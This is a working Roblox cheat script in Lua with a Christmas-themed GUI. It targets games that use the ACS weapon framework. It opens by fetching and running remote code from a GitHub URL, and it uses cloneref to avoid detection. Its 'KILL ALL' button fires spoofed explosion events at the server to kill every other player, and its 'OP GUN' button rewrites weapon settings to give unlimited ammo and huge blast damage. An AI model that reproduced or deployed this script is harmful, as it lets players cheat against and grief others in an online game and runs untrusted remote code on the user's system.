-- Check executor
coroutine.wrap(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
    if not require then
        game.Players.LocalPlayer:Kick("Executor Not Supported")
    end
end)()

local screengui = Instance.new("ScreenGui")
screengui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screengui.Parent = cloneref(game:GetService("CoreGui"))

local frame = Instance.new("Frame")
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.Size = UDim2.new(0, 500, 0, 300)
frame.Parent = screengui

local uidrag = Instance.new("UIDragDetector")
uidrag.Parent = frame

local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0, 16)
corner1.Parent = frame

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 20, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 240))
}
gradient.Rotation = 45
gradient.Parent = frame

local header = Instance.new("TextLabel")
header.Font = Enum.Font.GothamBold
header.Text = "🎄 Merry Christmas 🎄"
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.TextScaled = true
header.BackgroundTransparency = 1
header.Size = UDim2.new(1, 0, 0.2, 0)
header.Parent = frame

local buttonKillAll = Instance.new("TextButton")
buttonKillAll.Font = Enum.Font.GothamBold
buttonKillAll.Text = "🎁 KILL ALL"
buttonKillAll.TextColor3 = Color3.fromRGB(255, 255, 255)
buttonKillAll.TextScaled = true
buttonKillAll.BackgroundColor3 = Color3.fromRGB(170, 40, 40)
buttonKillAll.Size = UDim2.new(0.4, 0, 0.15, 0)
buttonKillAll.Position = UDim2.new(0.05, 0, 0.4, 0)
buttonKillAll.Parent = frame
local cornerKillAll = Instance.new("UICorner")
cornerKillAll.CornerRadius = UDim.new(0, 12)
cornerKillAll.Parent = buttonKillAll

buttonKillAll.MouseButton1Click:Connect(function()
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if v ~= game:GetService("Players").LocalPlayer then
            pcall(function()
                local args = {
                    [1] = v.Character.HumanoidRootPart.Position,
                    [2] = {
                        ["shellName"] = "RpgShell",
                        ["origin"] = Vector3.new(135.2593231201172, 91.23719787597656, -1167.622314453125),
                        ["weaponName"] = "RPG-7",
                        ["bulletID"] = game:GetService("Players").LocalPlayer.Name .. "49123078331733592355.5147448935341",
                        ["currentPenetrationCount"] = 0,
                        ["shellSpeed"] = 400,
                        ["localShellName"] = "RpgShell",
                        ["maxPenetrationCount"] = 3,
                        ["penetrationMultiplier"] = 0.8,
                        ["shellType"] = "Explosive",
                        ["shellMaxDist"] = 700000000000,
                        ["filterDescendants"] = {
                            [1] = workspace:WaitForChild("Po1seb"),
                            [2] = workspace:WaitForChild("Camera"):WaitForChild("Viewmodel")
                        }
                    }
                }

                game:GetService("ReplicatedStorage"):WaitForChild("ACS_Engine"):WaitForChild("Events"):WaitForChild("ExplosionFX"):FireServer(unpack(args))
            end)
        end
    end
end)

local buttonOpGun = Instance.new("TextButton")
buttonOpGun.Font = Enum.Font.GothamBold
buttonOpGun.Text = "🎁 OP GUN"
buttonOpGun.TextColor3 = Color3.fromRGB(255, 255, 255)
buttonOpGun.TextScaled = true
buttonOpGun.BackgroundColor3 = Color3.fromRGB(40, 170, 80)
buttonOpGun.Size = UDim2.new(0.4, 0, 0.15, 0)
buttonOpGun.Position = UDim2.new(0.55, 0, 0.4, 0)
buttonOpGun.Parent = frame
local cornerOpGun = Instance.new("UICorner")
cornerOpGun.CornerRadius = UDim.new(0, 12)
cornerOpGun.Parent = buttonOpGun

buttonOpGun.MouseButton1Click:Connect(function()
    local player = cloneref(game:GetService("Players")).LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    for _, tool in pairs(backpack:GetChildren()) do
        if tool.Name ~= "Knife" then
            local module = require(tool.ACS_Settings)
            module.Ammo = 99999
            module.StoredAmmo = 99999
            module.MaxStoredAmmo = 99999
            module.FireModes.Auto = true
            module.ShootRate = 9999
            module.CustomShellType = "Explosive"
            module.BulletType = "Rocket"
            module.gunName = "SolyNotHub On Top"
            module.Type = "Gun"
            module.Explosive = true
            module.Explosion = {
                Radius = 999,
                Damage = 999,
            }
        end
    end
end)

local instructionsLabel = Instance.new("TextLabel")
instructionsLabel.Font = Enum.Font.Gotham
instructionsLabel.Text = "Press LCtrl to toggle the GUI\nPress R/Reload to make OP GUN work\nEquip Gun first to use KILL ALL"
instructionsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
instructionsLabel.TextScaled = true
instructionsLabel.BackgroundTransparency = 1
instructionsLabel.Position = UDim2.new(0.05, 0, 0.75, 0)
instructionsLabel.Size = UDim2.new(0.9, 0, 0.2, 0)
instructionsLabel.Parent = frame

local isVisible = true
local tweenService = cloneref(game:GetService("TweenService"))

local function toggleGUI()
    if isVisible then
        local shrinkTween = tweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0), Transparency = 1})
        shrinkTween:Play()
        shrinkTween.Completed:Connect(function()
            screengui.Enabled = false
        end)
    else
        screengui.Enabled = true
        local expandTween = tweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500, 0, 300), Transparency = 0})
        expandTween:Play()
    end
    isVisible = not isVisible
end

local UserInputService = cloneref(game:GetService("UserInputService"))
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.LeftControl then
        toggleGUI()
    end
end)
